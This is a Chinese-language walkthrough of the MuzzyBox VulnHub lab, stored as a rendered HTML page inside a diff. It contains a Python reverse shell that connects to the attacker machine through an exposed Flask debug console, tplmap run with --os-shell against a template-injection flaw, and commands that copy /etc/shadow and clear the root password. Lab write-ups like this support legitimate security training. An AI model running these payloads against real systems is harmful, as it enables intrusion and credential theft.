@@ -1,0 +1,144 @@
+I"<h3 id="主机识别">主机识别</h3>
+
+<p><code class="language-plaintext highlighter-rouge">nmap -sn 192.168.1.1/24</code></p>
+
+<h3 id="网络拓扑">网络拓扑</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>计算机</th>
+      <th>IP</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Kali</td>
+      <td><code class="language-plaintext highlighter-rouge">192.168.1.107</code></td>
+    </tr>
+    <tr>
+      <td>MuzzyBox</td>
+      <td><code class="language-plaintext highlighter-rouge">192.168.1.105</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="扫描端口和版本信息">扫描端口和版本信息</h3>
+
+<p><code class="language-plaintext highlighter-rouge">nmap -A 192.168.1.105</code></p>
+
+<p><img src="https://i.loli.net/2020/05/01/46Q9Ax3bFDZhXHS.png" alt="2.png" /></p>
+
+<h3 id="访问web并确认web应用">访问Web并确认web应用</h3>
+
+<p>访问 <em>80</em> 端口我们看到有三个挑战，看来需要逐个通过这些挑战</p>
+
+<h3 id="挑战-1">挑战 1</h3>
+
+<p><img src="https://i.loli.net/2020/05/01/Y6NAxrsUJdujgVv.png" alt="3.png" /></p>
+
+<p>根据页面信息是需要上传一张图片来识别，刚开始认为是参考图片中存在某些信息，不过分析过后并没有什么特别。多次尝试后又根据提示是需要上传它的 <em>screenshot</em>，看来是要修改这个_idcard_</p>
+
+<p><img src="https://i.loli.net/2020/05/01/vO2NztCad5UfTMu.png" alt="idcard.png" /></p>
+
+<p><img src="https://i.loli.net/2020/05/01/YlrsChJMj73gDqS.png" alt="4.png" /></p>
+
+<blockquote>
+  <p>得到第一个重要信息：<code class="language-plaintext highlighter-rouge">P!N_!$_123-456-789}</code></p>
+</blockquote>
+
+<h3 id="挑战-2">挑战 2</h3>
+
+<p>这是一个 <code class="language-plaintext highlighter-rouge">_Flask_</code> 应用，并且打开了 <strong>debug</strong> 调试模式，可能可以执行系统命令<sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote">1</a></sup></p>
+
+<p><img src="https://i.loli.net/2020/05/01/YRNiH6SQbIvdZBW.png" alt="5.png" /></p>
+
+<p>将该代码复制到 <code class="language-plaintext highlighter-rouge">_console_</code> 执行，并在 Kali 上开启监听即可 <code class="language-plaintext highlighter-rouge">_getshell_</code></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">socket</span><span class="p">,</span><span class="n">subprocess</span><span class="p">,</span><span class="n">os</span><span class="p">;</span>
+<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">);</span>
+<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="s">"192.168.1.107"</span><span class="p">,</span><span class="mi">6677</span><span class="p">));</span>
+<span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">);</span> 
+<span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">);</span> 
+<span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">);</span>
+<span class="n">p</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">call</span><span class="p">([</span><span class="s">"/bin/sh"</span><span class="p">,</span><span class="s">"-i"</span><span class="p">]);</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="https://i.loli.net/2020/05/01/CniExk3mTVRt75y.png" alt="6.png" /></p>
+
+<blockquote>
+  <p>得到第二个重要信息：<code class="language-plaintext highlighter-rouge">N$cTF{R34D_F!L3_/home/webssti/noflag.txt}</code></p>
+</blockquote>
+
+<p>看来我们的下一个目标就是读取该文件：<code class="language-plaintext highlighter-rouge">/home/webssti/noflag.txt</code></p>
+
+<h3 id="挑战-3">挑战 3</h3>
+
+<p><img src="https://i.loli.net/2020/05/01/6AltckXs7MmH4CG.png" alt="7.png" /></p>
+
+<p>测试发现存在 <em>XSS</em> 漏洞，不过这里是 <strong>SSTI</strong> 漏洞。为了利用该漏洞，使用 <strong>tplmap</strong> 开源工具</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre>git clone https://github.com/epinna/tplmap.git
+<span class="nb">cd </span>tplmap/
+<span class="nb">ls
+</span>python2 tplmap.py <span class="nt">-u</span> <span class="s2">"http://192.168.1.105:15000/page?name=muzzy"</span> <span class="nt">--os-shell</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="https://i.loli.net/2020/05/01/3zXSPTI2pYcD1Rh.png" alt="8.png" /></p>
+
+<blockquote>
+  <p>得到第三个重要信息：<code class="language-plaintext highlighter-rouge">ssh nsctf iamnsce</code></p>
+</blockquote>
+
+<p>接下来我们就是用 <em>ssh</em> 连接虚拟机，并且发现该目录（<code class="language-plaintext highlighter-rouge">/usr/local/sbin</code>）的用户组是 <em>nsctf</em>，也就说明该目录下的命令我们都可以执行</p>
+
+<p><img src="https://i.loli.net/2020/05/01/mUTptl6Ez1AYueV.png" alt="9.png" /></p>
+
+<p>在该目录下新建 <code class="language-plaintext highlighter-rouge">ls</code> 文件，并且也可以删除 <em>root</em> 用户的密码</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre><span class="nb">cat</span> /root/Final_Flag.txt <span class="o">&gt;</span> /home/nsctf/flag.txt
+<span class="nb">cat</span> /etc/passwd <span class="o">&gt;</span> /home/nsctf/passwd.txt
+<span class="nb">cat</span> /etc/shadow <span class="o">&gt;</span> /home/nsctf/shadow.txt
+passwd <span class="nt">-d</span> root
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="https://i.loli.net/2020/05/01/cZ3ej5wCyW7K4Vl.png" alt="10.png" /></p>
+
+<h3 id="总结">总结</h3>
+
+<p>虽然通过<code class="language-plaintext highlighter-rouge">uname -r</code>看到该Linux内核版本是：<em>4.15.0-88-generic</em>，经过 OSINT 找到该 exp<sup id="fnref:2" role="doc-noteref"><a href="#fn:2" class="footnote">2</a></sup>，但是需要某些命令支持，并且低权限用户不具备安装软件条件</p>
+
+<h3 id="ref">Ref.</h3>
+
+<ul>
+  <li><a href="https://www.hackingarticles.in/muzzybox-1-vulnhub-walkthrough/">hackingarticles</a></li>
+</ul>
+
+<hr />
+
+<div class="footnotes" role="doc-endnotes">
+  <ol>
+    <li id="fn:1" role="doc-endnote">
+      <p>Flask 打开 Debug 模式直接 getshell <a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+    <li id="fn:2" role="doc-endnote">
+      <p><a href="https://www.exploit-db.com/exploits/47166">exploit-db</a> <a href="#fnref:2" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+  </ol>
+</div>
+:ET
